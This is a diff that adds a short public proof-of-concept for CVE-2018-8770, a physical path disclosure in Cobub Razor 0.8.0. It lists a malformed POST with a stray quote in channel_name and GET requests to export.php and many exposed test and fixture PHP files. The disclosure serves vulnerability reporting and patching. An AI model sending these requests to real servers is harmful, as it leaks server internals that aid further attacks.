@@ -1,0 +1,30 @@
+# Exploit Title:  Cobub Razor 0.8.0 Physical path Leakage Vulnerability
+# Date: 2018-04-19
+# Exploit Author: Kyhvedn
+# Vendor Homepage: http://www.cobub.com/
+# Software Link: https://github.com/cobub/razor
+# Version: 0.8.0
+# CVE : CVE-2018-8770
+
+#PoC:
+
+URL: http://localhost/export.php
+HTTP Method: GET
+URL: http://localhost/index.php?/manage/channel/addchannel
+HTTP Method: POST
+Data: channel_name=test"&platform=1
+
+HTTP Method: GET
+http://localhost/tests/generate.php
+http://localhost/tests/controllers/getConfigTest.php
+http://localhost/tests/controllers/getUpdateTest.php
+http://localhost/tests/controllers/postclientdataTest.php
+http://localhost/tests/controllers/posterrorTest.php
+http://localhost/tests/controllers/posteventTest.php
+http://localhost/tests/controllers/posttagTest.php
+http://localhost/tests/controllers/postusinglogTest.php
+http://localhost/tests/fixtures/Controller_fixt.php
+http://localhost/tests/fixtures/Controller_fixt2.php
+http://localhost/tests/fixtures/view_fixt2.php
+http://localhost/tests/libs/ipTest.php
+http://localhost/tests/models/commonDbfix.php
